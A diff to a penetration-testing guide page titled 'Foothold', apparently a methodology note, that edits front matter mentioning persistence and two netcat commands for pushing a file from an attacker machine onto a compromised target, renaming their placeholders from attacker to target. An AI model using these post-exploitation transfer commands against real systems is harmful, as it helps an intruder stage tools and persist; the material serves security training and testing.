@@ -1,5 +1,7 @@
 ---
-title: 4 - Foothold
+title: 4 – Foothold
+summary: Foothold step – a note for confirming foothold and adding a little persistence.
+description: Foothold step – a note for confirming foothold and adding a little persistence.
 ---
 
 # Spawn Better Shell
@@ -34,11 +36,11 @@ title: 4 - Foothold
 
 
  > 
- > **<font color=red>nc -l -p </font>\[ATTACKER_PORT\] <font color=red>\></font> newFile**</br>
+ > **<font color=red>nc -l -p </font>\[TARGET_PORT\] <font color=red>\></font> newFile**</br>
  > Run on Target.
 
  > 
- > **<font color=red>nc -w -3</font> \[ATTACKER_IP\] \[ATTACKER PORT\] <font color=red>\<</font> myFile**</br>
+ > **<font color=red>nc</font> \[TARGET_IP\] \[TARGET PORT\] <font color=red>\<</font> myFile**</br>
  > Run on Attacker machine. Send a file on the target.
 
 ---
